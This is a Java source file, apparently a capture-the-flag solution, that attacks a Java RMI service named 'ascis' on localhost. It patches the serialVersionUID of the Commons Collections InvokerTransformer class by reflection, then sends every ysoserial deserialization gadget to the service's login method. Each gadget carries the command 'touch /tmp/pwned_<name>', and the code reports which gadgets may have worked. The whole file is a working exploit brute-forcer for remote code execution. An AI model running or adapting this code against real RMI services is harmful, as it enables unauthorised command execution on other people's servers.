package rmi;

import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.List;
import java.util.ArrayList;
import java.util.Collections;

import org.apache.commons.collections.functors.InvokerTransformer;
import ysoserial.payloads.*;
import ysoserial.Strings;

public class Main {
    public static void main(String[] args) throws Exception {
        // Connect to server
        Registry registry = LocateRegistry.getRegistry("localhost", 1099);
        ASCISInterf ascisInterf = (ASCISInterf) registry.lookup("ascis");


        // Get serialVersionUID field
        Field serialVersionUID = InvokerTransformer.class.getDeclaredField("serialVersionUID");
        serialVersionUID.setAccessible(true);

        // Modify modifiers filed to change static final serialVersionUID
        Field modifiers = Field.class.getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(serialVersionUID, serialVersionUID.getModifiers() & ~Modifier.FINAL);

        serialVersionUID.set(InvokerTransformer.class, -1333713373713373737L);


        // Get list of gadgets
        List<Class<? extends ObjectPayload>> payloadClasses = new ArrayList<>(ObjectPayload.Utils.getPayloadClasses());
        // Sort in alphabet order
        Collections.sort(payloadClasses, new Strings.ToStringComparator());

        // Try each gadget
        for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
            String payloadName = payloadClass.getSimpleName();

            String command = "touch /tmp/pwned_" + payloadName;
            ObjectPayload payload = payloadClass.newInstance();

            try {
                Object obj = payload.getObject(command);
                ascisInterf.login(obj);
            } catch (Exception e) {
                if (e.toString().indexOf("ClassNotFoundException") == -1) {
                    System.out.println("[*] Potential payload: " + payloadName);
                    System.out.println(e + "\n");
                }
            }
        }
    }
}
